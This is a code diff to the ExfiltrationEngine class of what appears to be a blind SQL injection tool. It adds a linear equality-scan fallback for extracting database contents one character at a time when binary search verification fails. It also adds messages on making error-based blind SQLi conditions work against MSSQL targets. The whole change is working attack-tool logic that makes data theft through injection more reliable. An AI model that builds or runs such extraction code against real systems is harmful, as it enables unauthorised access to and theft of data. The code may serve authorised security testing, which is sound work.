@@ -268,10 +268,32 @@ class ExfiltrationEngine:
         if self._is_true(target.char_is(pos, candidate)) is True:
             self._record_char_cost(steps + 1)
             return candidate
-        self.logger.error(
-            f"binary search converged on {candidate!r} at pos {pos} but verification "
-            f"failed; the character may be outside the configured charset"
+        # The ordering-based search disagreed with equality. That happens when
+        # the '<=' comparison behaves differently from the charset ordering
+        # (collation mismatch) or when every comparison errored (an invalid
+        # condition reads as FALSE in error-based blind SQLi). Fall back to an
+        # order-independent equality scan, which does not rely on '<='.
+        self.logger.verbose(
+            f"binary search picked {candidate!r} at pos {pos} but verification "
+            f"failed; falling back to a linear equality scan"
         )
+        found = self._linear_scan(target, pos)
+        if found is not None:
+            return found
+        self.logger.error(
+            f"position {pos}: no configured charset character verified true. In "
+            f"error-based blind SQLi an invalid SQL condition also reads as FALSE, "
+            f"so this usually means the condition is malformed for this target -- "
+            f"check --dialect (is it really MSSQL?), try --no-collation or "
+            f"--collation, or widen --charset."
+        )
+        return None
+
+    def _linear_scan(self, target: Target, pos: int) -> Optional[str]:
+        """Try every charset character by equality (order-independent)."""
+        for ch in self.ordered_charset:
+            if self._is_true(target.char_is(pos, ch)) is True:
+                return ch
         return None
 
     # ------------------------------------------------------------- helpers
